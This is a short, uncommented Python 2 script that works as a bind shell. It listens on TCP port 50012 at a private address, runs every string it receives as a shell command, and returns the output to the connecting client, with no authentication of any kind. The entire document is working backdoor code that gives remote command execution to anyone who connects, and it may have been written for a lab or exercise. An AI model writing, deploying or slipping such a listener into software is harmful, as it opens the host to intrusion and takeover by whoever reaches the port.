#!/usr/bin/env python
import socket
import commands

HOST = '192.168.200.132'
PORT = 50012
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

try:
    while 1:
        conn, addr = s.accept()
        print 'Connected by', addr
        while 1:
            data = conn.recv(1024)
            cmd_status, cmd_result = commands.getstatusoutput(data)
            if len(cmd_result.strip()) == 0:
                conn.sendall('Done.')
            else:
                conn.sendall(cmd_result)
        conn.close()

finally:
    s.close()

